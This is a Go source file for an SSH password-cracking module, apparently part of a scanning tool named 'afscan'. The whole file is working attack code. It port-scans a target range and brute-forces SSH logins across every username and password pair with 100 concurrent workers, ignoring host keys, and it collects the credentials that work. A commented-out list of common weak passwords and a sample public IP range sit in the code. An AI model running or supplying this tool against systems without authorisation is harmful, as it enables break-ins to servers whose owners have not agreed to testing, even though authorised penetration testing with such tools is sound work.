package sshcrack

import (
	"afscan/portscan"
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"strings"
	"sync"
	"time"
)

func SSH_Connect(address string, user string, password string) bool {
	//创建ssh登陆配置
	success := false
	config := &ssh.ClientConfig{
		Timeout:         2 * time.Second, //time.Duration(2)
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), //这个可以， 但是不够安全
		//HostKeyCallback: hostKeyCallBackFunc(h.Host),
	}

	//dial 获取ssh client
	//addr := fmt.Sprintf("%s:%d", ip, port)
	sshClient, err := ssh.Dial("tcp", address, config)
	/*
		if err != nil {
			//log.Fatal("创建ssh连接失败",err)
			return false
		}
	*/
	if err == nil {
		defer sshClient.Close()
		session, err := sshClient.NewSession()
		errRet := session.Run("echo 1")
		if err == nil && errRet == nil {
			defer session.Close()
			success = true
		}
	}
	return success
}

//定义结构体
type Task struct {
	ip       string
	user     string
	password string
}

var sucess_ip []string

//队列+结构体+高并发
func runTask(tasks []Task, threads int) {
	var wg sync.WaitGroup
	taskCh := make(chan Task, threads*2)
	for i := 0; i < threads; i++ {
		go func() {
			for task := range taskCh {
				//SSH_Connect(task.ip, task.user, task.password)
				if SSH_Connect(task.ip, task.user, task.password) {
					log.Printf("success %v %v %v\n", task.ip, task.user, task.password)
					var suess = fmt.Sprintf("%v %v %v", task.ip, task.user, task.password)
					sucess_ip = append(sucess_ip, suess)
				}
				//log.Printf("false %v,%v %v\n", task.ip, task.user, task.password)
				wg.Done()
			}
		}()
	}
	for _, task := range tasks {
		wg.Add(1)
		taskCh <- task
	}
	wg.Wait()
	close(taskCh)
}

//注意，是先icmp探存活，然后再扫端口，如果对方禁了icmp协议，需要tcp探测端口
func Main(ip string, ports string, sshUser string, sshPassword string) {
	var tasks []Task
	var ips []string
	var Passwords, User []string

	//t := 100
	//ip := "121.4.236.90-100"
	//ports := "22"
	//ips = icmpalive.Main(t,ip)
	ips = portscan.Second_Main(ports, ip)
	fmt.Println(ips)
	//address := "192.168.201.139:22"
	countSplit := strings.Split(sshPassword, ",")
	for _, password1 := range countSplit {
		Passwords = append(Passwords, password1)
	}
	countSplit1 := strings.Split(sshUser, ",")
	for _, user1 := range countSplit1 {
		User = append(User, user1)
	}
	//sshUser := []string{"ubuntu", "admin", "test", "user", "root"}
	//sshPassword := []string{"123456", "admin", "admin123", "root", "", "pass123", "pass@123", "password", "123123", "654321", "111111", "123", "1", "admin@123", "Admin@123", "admin123!@#", "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe!@#", "123456789", "123321", "666666", "a123456.", "123456~a", "123456!a", "000000", "1234567890", "8888888", "!QAZ2wsx", "1qaz2wsx", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.", "Aa12345", "a123456", "a123123", "Aa123123", "Aa123456", "Aa12345.", "sysadmin", "system", "1qaz!QAZ", "2wsx@WSX", "qwe123!@#", "Aa123456!", "A123456s!", "sa123456", "1q2w3e"}

	//sshPassword := []string{"root", "admin", "admin123", "Qax@123"}

	for _, ip := range ips {
		for _, user := range User {
			for _, pass := range Passwords {
				tasks = append(tasks, Task{ip, user, pass})
			}
		}
	}

	runTask(tasks, 100)

	/*
		for _,add := range ips{
			//fmt.Println(add)
			Loop:
			for _,User := range sshUser{
				for _,Pass := range sshPassword{
					if SSH_Connect(add,User,Pass) {
						log.Println(add,User,Pass+"\t连接成功")
						var suess = fmt.Sprintf("%s %s %s", add,User,Pass)
						sucess_ip = append(sucess_ip,suess)
						break Loop
					}else {
						fmt.Println(add,User,Pass+"\t连接失败")
					}
				}
			}
		}
	*/

	fmt.Println(sucess_ip)
}
